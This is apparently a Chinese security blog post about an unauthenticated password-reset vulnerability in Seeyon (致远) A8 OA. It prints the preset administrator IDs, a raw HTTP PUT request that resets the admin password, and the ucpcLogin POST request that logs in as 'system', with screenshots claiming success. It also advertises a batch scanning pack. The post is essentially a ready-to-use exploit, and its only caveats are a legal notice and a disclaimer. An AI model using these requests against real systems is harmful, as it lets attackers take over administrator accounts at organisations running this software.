#  致远OA ucpcLogin密码重置漏洞   
原创 丁永博  丁永博的成长日记   2024-03-26 23:59  
  
致远A8 存在密码重置漏洞，未授权的攻击者在知道用户名的情况下，可以构造特制的请求包，从而修改用户密码，登录系统后台。  
  
根据致远的手册可知，管理员的预制id  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqplXkspwX8Bic8kYjgLs5NOS7cD8ZzR1wrGDyUJzV6qWOM83DHicjibvicySpnuW7EcsWTiaam7hKSKYgQ/640?wx_fmt=png&from=appmsg "")  
```
/**
     * 系统管理员预置ID
     * @deprecated 角色角色化后，废弃不再使用
     */
    public static final Long SYSTEM_ADMIN_ID = -7273032013234748168L;
    /**
     * 审计管理员预置ID
     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除
     */
    public static final Long AUDIT_ADMIN_ID = -4401606663639775639L;
    /**
     * 集团管理员预置ID
     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除
     */
    public static final Long GROUP_ADMIN_ID = 5725175934914479521L;
```  
  
构造根据预制id数据包获取登录名  
```
PUT /seeyon/rest/orgMember/-7273032013234748168/password/share.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqplXkspwX8Bic8kYjgLs5NOS657R2C8RMe1m0B2S7gQbA0QOw4UQaCdJL0W7sMoynuFPTtYV6Jc8qg/640?wx_fmt=png&from=appmsg "")  
  
构造数据包更改密码  
```
POST /seeyon/rest/authentication/ucpcLogin?login_username=system&login_password=share.do&ticket= 
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqplXkspwX8Bic8kYjgLs5NOSb5ibh7ohjhj17xSSKnmAyqv1vo6DTiaKVFGPvJhPGdqL1qkvZclbDlKQ/640?wx_fmt=png&from=appmsg "")  
  
成功登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqplXkspwX8Bic8kYjgLs5NOSSAydCrTgD9O54YWiaRIgJ3UiaOzlEX3aiayZLLrkM3tBP08wkiaXHXBNLw/640?wx_fmt=png&from=appmsg "")  
  
批量检测包放知识星球  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vfnOYb9lyqogfoDiaZULMiaEMBuGYKTia7dv9wK2qyS5ib3kAuFeZEyiaRnQn0slpQmRPkILkIrLudibb9554w62MffA/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqplXkspwX8Bic8kYjgLs5NOSPL7Vvuqu88KfHkviaHC0TUEZEILeFqmoK8rmAiaxWpIOicibVrnF8J8Q2A/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
小知识  
  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息系统罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/vfnOYb9lyqr922u4gKibKgUuPUMicLibMqiajkAJp8vG8WLtiav9gmSF7T453KlPULqXgXJFaiat5gqogqncOXrghYPA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
欢迎   
**在看**  
丨  
**留言**  
丨  
**分享至朋友圈**  
 三连  
  
 **好文推荐******  
  
- [免登录读取别人的WX聊天记录](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247487346&idx=1&sn=9810af860afd8f94e1cf2ccf81a7e13f&chksm=c20a2c55f57da543fe1bdc21e670d036cb10efccf4d102a4bf9cb7c3956786858230c8172b54&scene=21#wechat_redirect)  
  
  
- [实战|监控里的秘密](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247484122&idx=1&sn=88801391b60d3b77df97026e9e495ec2&chksm=c20a21fdf57da8eb9641bff94074f2aa736d12e3a48098d33e66aca17ded9267e6686ddb9452&scene=21#wechat_redirect)  
  
  
- [木马工具|控制别人的电脑，非常简单！](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247484445&idx=1&sn=bb60b1a6a69c8c2d31a6e8d5fb09a638&chksm=c20a273af57dae2c544388af5d942e9100225f400d055274123dcd13784c21ec598b4f2e7591&scene=21#wechat_redirect)  
  
  
- [BlueLotus联动DVWA，实现xss窃取cookie](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247486084&idx=1&sn=62d3d7448aa06365d15157326e59b8e7&chksm=c20a29a3f57da0b56f4e5323d7c6b05e91b597df2697934e7903c27a730e2f4443983216f289&scene=21#wechat_redirect)  
  
  
- [实战|逻辑漏洞绕过](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247509911&idx=1&sn=c37f416483c1ab4bc7b8ee13a379280a&chksm=9acd7708adbafe1ef9f9f030e9de25446eacec18bd15df2f76ba21a4031c7f827563c03bb907&scene=21#wechat_redirect)  
  
  
- [路边的u盘你不要捡，山下的女人是老虎~](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485822&idx=1&sn=a5e05071dccc53fecc4b69d513489444&chksm=c20a2a59f57da34f00a26cab87251fffb1ca7ca51c658fea0d5e7f08788c1d59d86f95fc137a&scene=21#wechat_redirect)  
  
  
- [永恒之蓝彩虹猫联动](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485315&idx=1&sn=c64f1d550507b15b7655a6ec18e857de&chksm=c20a24a4f57dadb219c1ef76e18fad92932596782d9d7c10f264cb23245af31d5624666de16f&scene=21#wechat_redirect)  
  
  
- [5min学渗透|wifi断网攻击、暴力攻击](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485194&idx=1&sn=c425ac374dde652c5ac820b8b7aa5fdd&chksm=c20a242df57dad3b2fe01e302955f3ad3f25cde0ab8e08bb21a431c24f3acad965472efcdbed&scene=21#wechat_redirect)  
  
  
- [5min学渗透|你的手机是如何被监控的?](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485149&idx=1&sn=242ab51f1c6797cdff86af09a6ef6a1d&chksm=c20a25faf57dacec21276c8509c453a4c8446fdf44494ec2663ca61aab494ca7edc1eedc8694&scene=21#wechat_redirect)  
  
  
- [5min学渗透|简单制作钓鱼wifi 01](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485124&idx=1&sn=21899d53b348d7daa9e73b464fb9d423&chksm=c20a25e3f57dacf54e101b31ae6b292f822fc012795b604df0f15231072e80d887e8d98090bf&scene=21#wechat_redirect)  
  
  
- [实用小工具|破解office三件套加密密码](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485123&idx=1&sn=21bc7ca9cc48d0270667709dc448410f&chksm=c20a25e4f57dacf27d5fb2d90f1ac6c04ac36ca5549023c4d83c85ff5464632563bad975cd50&scene=21#wechat_redirect)  
  
  
  
  
  
